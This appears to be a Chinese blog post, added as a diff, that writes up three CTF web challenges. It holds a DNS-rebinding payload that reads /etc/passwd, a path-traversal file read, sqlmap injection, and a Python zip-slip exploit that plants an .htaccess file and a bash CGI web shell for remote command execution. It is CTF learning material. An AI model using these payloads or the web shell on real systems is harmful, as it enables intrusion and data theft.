@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言早知道不做理论题了()，这个比赛的CTF有点逆天，本来不想复现的 题目ezdeno这道题提供了一个接口调用指定url的ts文件，可以调用执行，ssrf?这里似乎只能调用localhost?WP的方法没接触过，来复现一下 1使用 DNS Rebinding 技巧。多次调用 &#96;7f000001.$&#123;hostHex&#125;.rbndr.us:port&#x2F;module&#x2F;exp.ts&#96; 可以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025高校管理运维赛复现">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="前言早知道不做理论题了()，这个比赛的CTF有点逆天，本来不想复现的 题目ezdeno这道题提供了一个接口调用指定url的ts文件，可以调用执行，ssrf?这里似乎只能调用localhost?WP的方法没接触过，来复现一下 1使用 DNS Rebinding 技巧。多次调用 &#96;7f000001.$&#123;hostHex&#125;.rbndr.us:port&#x2F;module&#x2F;exp.ts&#96; 可以">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251022121926571.png">
+<meta property="article:published_time" content="2025-10-26T10:16:08.000Z">
+<meta property="article:modified_time" content="2025-10-26T10:17:20.039Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251022121926571.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2025高校管理运维赛复现</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/C3P0-%E9%93%BE%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&text=2025高校管理运维赛复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&title=2025高校管理运维赛复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&is_video=false&description=2025高校管理运维赛复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2025高校管理运维赛复现&body=Check out this article: https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&title=2025高校管理运维赛复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&title=2025高校管理运维赛复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&title=2025高校管理运维赛复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&title=2025高校管理运维赛复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&name=2025高校管理运维赛复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&t=2025高校管理运维赛复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">2.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezdeno"><span class="toc-number">2.1.</span> <span class="toc-text">ezdeno</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eznode"><span class="toc-number">2.2.</span> <span class="toc-text">eznode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rustpages"><span class="toc-number">2.3.</span> <span class="toc-text">rustpages</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag2"><span class="toc-number">2.3.1.</span> <span class="toc-text">flag2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">3.</span> <span class="toc-text">结语</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        2025高校管理运维赛复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-26T10:16:08.000Z" class="dt-published" itemprop="datePublished">2025-10-26</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/%E5%A4%8D%E7%8E%B0/">复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>早知道不做理论题了()，这个比赛的CTF有点逆天，本来不想复现的</p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="ezdeno"><a href="#ezdeno" class="headerlink" title="ezdeno"></a>ezdeno</h3><p>这道题提供了一个接口调用指定url的ts文件，可以调用执行，ssrf?这里似乎只能调用localhost?<br>WP的方法没接触过，来复现一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用 DNS Rebinding 技巧。多次调用 `7f000001.$&#123;hostHex&#125;.rbndr.us:port/module/exp.ts` 可以让这个域名进入白名单后，DNS 重新绑定到真实主机并执行 Exp。</span><br></pre></td></tr></table></figure></div>
+<p>这里利用了DNS重绑定进行绕过<br>首次DNS解析：返回 7f000001.ac110001.rbndr.us → 127.0.0.1<br>认为这是”安全”的<br>第二次DNS解析：返回真正的目标IP 172.17.0.1(vps地址)<br>攻击生效：浏览器向172.17.0.1:8000 发送请求<br>我们简单开下vps试一下效果，ts文件内容如下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export <span class="keyword">default</span> function <span class="title function_">exp</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> Deno.readTextFileSync(<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>这里转换是基于</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="variable">hostHex</span> <span class="operator">=</span> HOST.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">  .map((x) =&gt; (<span class="string">&#x27;0&#x27;</span> + parseInt(x).toString(<span class="number">16</span>)).slice(-<span class="number">2</span>))</span><br><span class="line">  .join(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+<p>这里结合vps得到域名<code>http://7f000001.xxxxxx.rbndr.us:5000/module/exp.ts</code><br>然后在invoke端口多传几遍，即可回显<code>/etc/passwd</code><br>执行命令<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251022121926571.png"><br>一直对于DNS重绑定只是耳熟从未碰到，如今也是一窥真容了<br>这里有个网站<code>https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg</code>，可以看看</p>
+<p>而对于DNS重绑定如果需要更好的理解，训练，可以看这篇文章<code>https://xz.aliyun.com/news/7091</code><br>跟着搭一下会有不错效果</p>
+<h3 id="eznode"><a href="#eznode" class="headerlink" title="eznode"></a>eznode</h3><p>这道题需要信息收集看到一个manege接口<br>然后config接口看到mode&#x3D;debug，然后flag被保护<br>这个时候直接&#x2F;manege?mode&#x3D;debug即可看到flag<br>或者找到manege接口之后直接arjun扫<br>再看config拿到flag1<br>-开启sql注入接口<br>直接sqlmap注入 <code>--batch</code><br>确定sqlite，再dump即可看到flag2<br>信息收集？我去你的</p>
+<h3 id="rustpages"><a href="#rustpages" class="headerlink" title="rustpages"></a>rustpages</h3><p>可能是强网磨灭了我扫目录的心情，我都没扫()<br>先扫目录看到<br><code>/api/swagger.json</code><br>该文档暴露所有接口信息，因此，找到&#x2F;api&#x2F;debug<br>这里两个参数一个路径一个文件名，直接读取flag1</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">../../../../../</span><br><span class="line">/flag1</span><br></pre></td></tr></table></figure></div>
+<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>根目录的flag2读取需要权限，与此同时，存在&#x2F;readflag2<br>此时需要寻找rce<br>现在实现任意文件读之后，就可以读取源码了<br>这样审计源代码之后发现，密钥被硬编码，即泄露<br>现在可以伪造登录，调用zip上传等接口<br>这个地方，存在<code>../</code>，可以跨目录写入<br>再读Dockerfile</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOCKERFILE"><figure class="iseeu highlight /dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> rust:slim</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> Cargo.toml Cargo.lock ./</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> src &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">  <span class="built_in">echo</span> <span class="string">&#x27;fn main() &#123; println!(&quot;Placeholder&quot;); &#125;&#x27;</span> &gt; src/main.rs &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">  cargo build --release</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> src ./src/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">touch</span> src/main.rs &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">  cargo build --release</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">  apt-get install -y --no-install-recommends ca-certificates apache2 <span class="built_in">sudo</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">  apt-get clean &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">  <span class="built_in">rm</span> -rf /var/lib/apt/lists/*</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> apache2.conf /etc/apache2/apache2.conf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> 000-default.conf /etc/apache2/sites-available/000-default.conf</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> a2enmod proxy proxy_http cgi rewrite</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> a2dismod status</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> static/. /var/www/html/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> Dockerfile ./</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> readflag2.c /readflag2.c</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> gcc -static -o /readflag2 /readflag2.c &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">  <span class="built_in">rm</span> /readflag2.c &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">  <span class="built_in">chmod</span> +s /readflag2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R www-data:www-data /var/www/html &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">  <span class="built_in">chown</span> -R www-data:www-data /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;chmod 444 /flag1 &amp;&amp; chmod 000 /flag2 &amp;&amp; (apache2ctl -D FOREGROUND &amp; sudo -u www-data ./target/release/rust-pages)&quot;</span>]</span></span><br></pre></td></tr></table></figure></div>
+<p>发现该服务</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以 www-data 用户运行的，由 Apache 提供反向代理。Apache 启用了 CGI 模块，且 `/var/www/html` 目录是 www-data 用户可写的，因此可以将 `.htaccess` 和 CGI WebShell 脚本写入 `/var/www/html` 目录，从而实现 RCE，运行 `/readflag2` 以读取 flag2。</span><br></pre></td></tr></table></figure></div>
+<p>这是wp的超绝脚本</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">manifest = &#123;</span><br><span class="line">    <span class="string">&quot;webroot&quot;</span>: <span class="string">&quot;a/b/c/d&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">io = BytesIO()</span><br><span class="line">exp = zipfile.ZipFile(io, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">exp.writestr(<span class="string">&quot;manifest.json&quot;</span>, json.dumps(manifest).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">exp.writestr(</span><br><span class="line">    <span class="string">&quot;a/b/c/d/../../../../var/www/html/.htaccess&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;&quot;&quot;Options ExecCGI</span></span><br><span class="line"><span class="string">AddHandler cgi-script .cgi</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,</span><br><span class="line">)</span><br><span class="line">exp.writestr(</span><br><span class="line">    <span class="string">&quot;a/b/c/d/../../../../var/www/html/shell.cgi&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;&quot;&quot;#!/bin/bash</span></span><br><span class="line"><span class="string">echo &quot;Content-type: text/html&quot;</span></span><br><span class="line"><span class="string">echo &quot;&quot;</span></span><br><span class="line"><span class="string">echo &quot;$QUERY_STRING&quot; | sed &quot;s/%20/ /g&quot; | bash 2&gt;&amp;1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,</span><br><span class="line">)</span><br><span class="line">exp.close()</span><br><span class="line"></span><br><span class="line">session.post(</span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/api/sites&quot;</span>,</span><br><span class="line">    files=&#123;<span class="string">&quot;archive&quot;</span>: (<span class="string">&quot;exp.zip&quot;</span>, io.getvalue(), <span class="string">&quot;application/zip&quot;</span>)&#125;,</span><br><span class="line">)</span><br><span class="line">flag2 = session.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/shell.cgi?/readflag2&quot;</span>).text</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Flag2:&quot;</span>, flag2)</span><br></pre></td></tr></table></figure></div>
+<p>成功执行命令拿到flag2<br>其实题目还不错()，可以学到东西，任意文件传到RCE  </p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>做的挺怪倒是，信息搜集不到位？知识面有欠缺？得练</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">2.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezdeno"><span class="toc-number">2.1.</span> <span class="toc-text">ezdeno</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eznode"><span class="toc-number">2.2.</span> <span class="toc-text">eznode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rustpages"><span class="toc-number">2.3.</span> <span class="toc-text">rustpages</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag2"><span class="toc-number">2.3.1.</span> <span class="toc-text">flag2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">3.</span> <span class="toc-text">结语</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&text=2025高校管理运维赛复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&title=2025高校管理运维赛复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&is_video=false&description=2025高校管理运维赛复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2025高校管理运维赛复现&body=Check out this article: https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&title=2025高校管理运维赛复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&title=2025高校管理运维赛复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&title=2025高校管理运维赛复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&title=2025高校管理运维赛复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&name=2025高校管理运维赛复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
